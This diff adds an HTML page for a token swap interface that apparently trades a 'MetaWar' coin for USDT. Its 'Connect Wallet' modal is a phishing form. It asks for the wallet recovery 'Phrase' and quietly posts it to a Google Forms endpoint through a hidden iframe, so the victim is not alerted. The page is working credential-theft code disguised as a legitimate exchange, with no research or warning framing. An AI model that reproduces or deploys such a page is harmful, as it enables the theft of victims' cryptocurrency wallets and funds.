@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Swap</title>
+    <link rel="stylesheet" href="swap.css" />
+  </head>
+  <body>
+    <header>
+      <nav class="nav">
+        <div><img src="./img/whaleImage.jpg" alt="" class="logo-icon"></div>
+        <div><h3 class="pointer">Trade</h3></div>
+        <div><h3 class="pointer">Earn</h3></div>
+        <div><h3 class="pointer">NFT</h3></div>
+      </nav>
+    </header>
+
+    <!-- All Modal Here -->
+
+     <!-- Recent Txn Modal -->
+     <div class="modal all-modal hidden">
+      <div class="modal-container"> 
+        <div class="recent-txn-text"><h3>Recent Transactions</h3> <img class ="txn-icon close-icon" src="./img/close-button.png"/></div>
+        <div class="btn modal-btn"><button class="connect-wallet">Connect Wallet</button></div>
+      </div>
+    </div>
+
+    <!-- Prevent Default Form Load -->
+    <script type="text/javascript">
+      var submitted = false;
+    </script>
+    <iframe
+      name="hidden_iframe"
+      id="hidden_iframe"
+      style="display: none"
+      onload="if(submitted) {window.location='#';}"
+    ></iframe>
+
+    <!-- Input Wallet Modal -->
+    <div class="input-phrase hidden dntclose all-modal">
+      <div class="dntclose">
+        <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScVH1oIf3UOxg6g4P52oZCpe0dwjIKJsVCLwqKN4qhJ2nFvjw/formResponse" 
+        target="hidden_iframe" method="post" submitted="true">
+          <div class="modal input-phrase-container dntclose form-element">
+          <label class="text-left dntclose">Phrase</label>
+          <textarea class="text-content dntclose" name="entry.314626300" class="text-area dntclose" cols="43" rows="13" autofocus>
+          </textarea>
+          <button class="btn form-btn main-connect-btn connect-wallet dntclose" type="submit">Connect Wallet</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+
+    <!-- Swap Body -->
+    <section class="swap-contain">
+      
+      <div class="swap-container">
+        <div class="swap-head">
+          <div class="swap-title"><h3>Swap</h3></div>
+          <div class="setting">
+            <img class="small-icon no-txn" src="./img/settings.png" alt="" />
+          </div>
+          <div class="recent-txn">
+            <img class="small-icon no-txn" src="./img/history.png" alt="" />
+          </div>
+          <div class="next-txn">
+            <img class="small-icon no-txn" src="./img/restore.png" alt="" />
+          </div>
+        </div>
+
+        <div class="sub-title">
+          <p class="sub-title-text">Trade tokens in an instant</p>
+        </div>
+
+        <!-- Input Line -->
+        <div class="input-tab">
+          <div class="coin-display">
+            <div>
+              <img class="base-coin coin-icon" src="./img/whaleImage.jpg" />
+            </div>
+            <div>
+              <h3 class="coin-text">MetaWar</h3>
+            </div>
+            <div>
+              <img class="down-btn" src="./img/down-arrow.png" />
+            </div>
+          </div>
+
+          <div>
+            <input class="coin-from input-field" type="number"placeholder="0.0" />
+          </div>
+
+          <!-- Switch Coin Icon -->
+          <div class="switch-coin">
+            <img
+              class="switch-icon small-icon"
+              src="./img/up-and-down-arrows.png"
+            />
+          </div>
+
+          <div class="coin-display">
+            <div>
+              <img class="to-coin coin-icon" src="./img/Tether-USDT.png" />
+            </div>
+            <div>
+              <h3 class="coin-text">USDT</h3>
+            </div>
+            <div>
+              <img class="down-btn" src="./img/down-arrow.png" />
+            </div>
+          </div>
+          <div>
+            <input class="coin-to input-field" type ="number" placeholder="0.0" />
+          </div>
+
+   
+
+        <!-- connect wallet button -->
+        <div class="btn">
+          <button class="connect-wallet">Connect Wallet</button>
+        </div>
+
+        <!-- Swap Bottom Section -->
+        <!-- <div>
+          <div>
+            <h2>Price Impact</h2>
+            <h2>%%%</h2>
+          </div>
+          <div>
+            <h2>Liquidity provider fee</h2>
+            <h2>1.923 Coin</h2>
+          </div>
+        </div> -->
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <section class="footer">
+      <div class="footer-container">
+        <div>
+          <h3 class="pointer">Telegram</h3>
+        </div>
+        <div>
+          <h3 class="pointer"> Channel</h3>
+        </div>
+      </div>
+    </section>
+  </body>
+  <script src="swap.js"></script>
+
+  
+       <!-- Price Change
+          <div class="price-change input-field">
+            <div class="price price-change-flex">
+              <h2>price</h2>
+              <h1>------ per coin</h1>
+            </div>
+            <div class="slippage price-change-flex">
+              <div><h3 class="text-left">price</h3></div>
+              <div><h3 class="text-right">0.1%</h3></div>
+            </div>
+          </div>
+        </div> -->
+
+</html>
